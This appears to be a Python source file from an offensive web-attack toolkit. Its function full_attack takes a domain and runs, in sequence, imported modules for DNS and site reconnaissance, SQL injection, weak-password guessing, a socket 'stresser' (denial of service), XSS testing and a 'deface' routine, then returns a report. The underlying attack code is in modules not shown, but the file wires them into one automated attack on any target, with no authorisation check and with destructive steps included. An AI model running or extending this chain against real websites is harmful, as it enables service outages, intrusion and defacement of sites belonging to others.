from scanner.deface import deface
from scanner.dnsrecords import find_dns_records
from scanner.generalinfo import gather_website_info
from scanner.sql_injection import sqlscanner
from scanner.weak_passwords import weakpasswords
from scanner.websitestresser import SocketStress
from scanner.xss import xssVulnurable

def full_attack(domain):
    domain = domain.replace("https://", "").replace("http://", "").strip("/")

    attack_results = {}

    try:
        attack_results['DNS Records'] = find_dns_records(domain)
    except Exception as e:
        attack_results['DNS Records'] = f"Failed: {str(e)}"

    try:
        attack_results['General Info'] = gather_website_info(domain)
    except Exception as e:
        attack_results['General Info'] = f"Failed: {str(e)}"

    try:
        attack_results['SQL Injection'] = sqlscanner(domain)
    except Exception as e:
        attack_results['SQL Injection'] = f"Failed: {str(e)}"

    try:
        attack_results['Weak Passwords'] = weakpasswords(domain)
    except Exception as e:
        attack_results['Weak Passwords'] = f"Failed: {str(e)}"

    try:
        stresser = SocketStress(domain)
        attack_results['Website Stresser'] = stresser.start_attack()
    except Exception as e:
        attack_results['Website Stresser'] = f"Failed: {str(e)}"

    try:
        attack_results['XSS Vulnerability'] = xssVulnurable(domain)
    except Exception as e:
        attack_results['XSS Vulnerability'] = f"Failed: {str(e)}"

    try:
        attack_results['Deface'] = deface(domain)
    except Exception as e:
        attack_results['Deface'] = f"Failed: {str(e)}"

    attack_report = "\n".join(f"{attack}: {result}" for attack, result in attack_results.items())
    
    if any(result and "Failed" not in result for result in attack_results.values()):
        return 200, attack_report